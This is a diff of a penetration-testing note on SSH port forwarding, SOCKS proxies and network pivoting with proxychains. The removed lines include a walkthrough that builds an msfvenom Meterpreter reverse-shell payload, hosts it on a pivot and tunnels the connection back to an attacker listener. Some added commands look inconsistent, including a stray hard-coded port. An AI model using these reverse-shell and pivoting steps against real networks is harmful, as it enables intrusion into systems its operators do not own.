@@ -1,34 +1,25 @@
-Port forwarding is a networking technique that redirects network traffic through an SSH tunnel, allowing access to services that are not directly reachable from the attacker machine.
+Port forwarding is a technique that redirects network traffic through an SSH tunnel, allowing access to services that are not directly reachable from the attacker machine. It is commonly used during lateral movement and network pivoting.
 
 ---
 
 ## Local Port Forwarding
 
-- **Definition**: Opens a port on the attacker machine and forwards traffic through the SSH pivot host to a service reachable from the victim network. The destination host is resolved from the perspective of the SSH server.
-    
-- **Use Case**: Accessing an internal service running on the compromised host or inside its internal network.
-    
+Local port forwarding exposes a port on the attacker machine and forwards traffic through the SSH connection to a service reachable from the pivot host.
+
+This is useful when a service is only accessible from the compromised machine or its internal network.
 
 ```bash
-ssh -L [attacker_port]:[victim_host]:[victim_service_port] user@pivot_host
+ssh -N -L 0.0.0.0:[attacker_port]:[target_host]:[target_port] user@pivot_host
 ```
 
-Meaning:
-
-- `attacker_port` → Port opened locally on the attacker machine
-    
-- `victim_host` → Host reachable from the pivot machine
-    
-- `victim_service_port` → Target service port inside the victim network
-    
 
 ### Forwarding Multiple Ports
 
-Multiple local tunnels can be created within the same SSH session.
+Multiple tunnels can be created in a single SSH session.
 
 ```bash
-ssh -L [attacker_port1]:[victim_host1]:[victim_service_port1] \
-    -L [attacker_port2]:[victim_host2]:[victim_service_port2] \
+ssh -L [port1]:[host1]:[service1] \
+    -L [port2]:[host2]:[service2] \
     user@pivot_host
 ```
 
@@ -36,110 +27,34 @@ ssh -L [attacker_port1]:[victim_host1]:[victim_service_port1] \
 
 ## Remote Port Forwarding
 
-- **Definition**: Opens a port on the pivot host and forwards incoming connections back to a service running on the attacker machine.
-    
-- **Use Case**: Exposing a local attacker service (listener, reverse shell, web server) to systems that can reach the pivot host.
-    
+Remote port forwarding exposes a port on the pivot host and forwards incoming connections back to the attacker machine.
+
+This is typically used to receive reverse shells or expose local services.
 
 ```bash
-ssh -R [pivot_port]:[attacker_host]:[attacker_service_port] user@pivot_host
+ssh -N -R 127.0.0.1:[attacker_port]:[pivot_host]:[pivot_port] user@attacker_host
 ```
 
-Meaning:
-
-- `pivot_port` → Port opened on the pivot host
-    
-- `attacker_host` → Usually localhost from attacker perspective
-    
-- `attacker_service_port` → Service running on attacker machine
-
-### Gaining a Reverse Shell from an unreachable host
-
-In segmented networks, a target system may not have a route to the attacker machine due to firewall rules or network isolation. However, the target can often communicate with an internal pivot host. By using remote port forwarding, the pivot host exposes a reachable port that transparently tunnels reverse connections back to the attacker listener through SSH, allowing reverse shells even when direct connectivity is impossible.
-
-
-#### Creating a Reverse Payload
-
-Generate a payload configured to connect to the pivot host instead of the attacker machine:
-
-```bash
-msfvenom -p windows/x64/meterpreter/reverse_https \
-lhost=[pivot_internal_ip] \
-lport=[pivot_listen_port] \
--f exe -o payload.exe
-```
-
-#### Starting a Listener on the Attacker Host
-
-```bash
-msfconsole
-use exploit/multi/handler
-set payload windows/x64/meterpreter/reverse_https
-set lhost 0.0.0.0
-set lport [attacker_listener_port]
-run
-```
-
-The listener waits locally for connections that will arrive through the SSH tunnel.
-
-#### Uploading the Payload to the Pivot Host
-
-```bash
-scp payload.exe user@[pivot_host]:~/
-```
-
-
-#### Hosting the Payload from the Pivot
-
-```bash
-python3 -m http.server [web_port]
-```
-
-This allows internal targets to download the payload from the pivot system.
-
-#### Remote / Reverse Port Forwarding (SSH -R)
-
-```bash
-ssh -R [pivot_listen_ip]:[pivot_listen_port]:[attacker_ip]:[attacker_listener_port] \
-user@[pivot_host] -vN
-```
-
-#### Traffic Flow
-
-```
-Target → Pivot Host (listening port)
-        → SSH tunnel
-        → Attacker listener
-```
-
-From the attacker perspective, the connection often appears as coming from `127.0.0.1` because it arrives through the local SSH socket.
+> Local port forwarding lets the attacker reach internal services through the pivot, while remote port forwarding exposes an attacker-controlled service to the pivot network. This is especially useful when firewalls block inbound connections but allow outbound traffic, enabling the pivot to initiate the tunnel back to the attacker.
 
 ---
 
 ## Dynamic Port Forwarding
 
-- **Definition**: Creates a SOCKS proxy on the attacker machine that dynamically routes traffic through the pivot host to internal network targets.
-    
-- **Use Case**: Network pivoting, internal scanning, or routing tools through an SSH tunnel.
-    
+Dynamic port forwarding creates a SOCKS proxy on the attacker machine. Tools can route traffic through this proxy to reach internal networks.
 
 ```bash
-ssh -D [attacker_socks_port] user@pivot_host
+ssh -N -D 127.0.0.1:[socks_port] user@pivot_host
 ```
 
-### How It Works
-
-The SSH client opens a local SOCKS listener on the attacker machine. Any application configured to use this proxy sends its traffic to the local port, which is then securely forwarded through the SSH connection and routed by the pivot host to reachable internal networks.
-
-### Firewall Considerations
-
-Dynamic port forwarding is commonly used to bypass network segmentation and firewall restrictions. Since traffic is encapsulated inside an outbound SSH connection (usually allowed on port 22), internal firewalls may treat the traffic as trusted communication originating from the pivot host.
 
 ### Proxy Configuration
 
 To route tools through the tunnel, a proxy-aware wrapper such as **proxychains** can be used.
 
-Add the SOCKS proxy to the configuration file:
+> The forwarding  works because client tools like Proxychains wrap outbound connections in SOCKS protocol headers. These headers tell the SOCKS server (in this case, OpenSSH) where to send the traffic. Without them, the server can’t forward the packets correctly.
+
+Add the SOCKS proxy to the configuration file. If the <pivot_host> is the attacker machine, you can use localhost (127.0.0.1). Otherwise, replace it with the pivot host IP.
 
 ```bash
 /etc/proxychains.conf
@@ -147,14 +62,30 @@ Add the SOCKS proxy to the configuration file:
 socks5 127.0.0.1 [attacker_socks_port]
 ```
 
-### Example Usage
 
-Scanning an internal network through the pivot host:
+---
+
+## Remote Dynamic Port Forwarding
+
+Remote dynamic port forwarding creates a SOCKS proxy on the attacker machine, but the SSH connection is initiated from the pivot host. This allows full network pivoting even when the attacker cannot directly reach the pivot.
+
+Unlike classic remote port forwarding (one port per tunnel), this provides dynamic routing to any host and port reachable from the pivot.
+
 ```bash
-proxychains nmap -sT -Pn 172.16.5.0/24
+ssh -N -R [socks_port] attacker@<attacker_ip>
 ```
 
-Connecting to an internal service:
+This binds a SOCKS proxy on the attacker machine at:
+
+```text
+127.0.0.1:9998
+```
+
+
+### Proxy configuration
+
 ```bash
-proxychains xfreerdp /v:172.16.5.19
+/etc/proxychains.conf
+
+socks5 127.0.0.1 [attacker_socks_port]
 ```
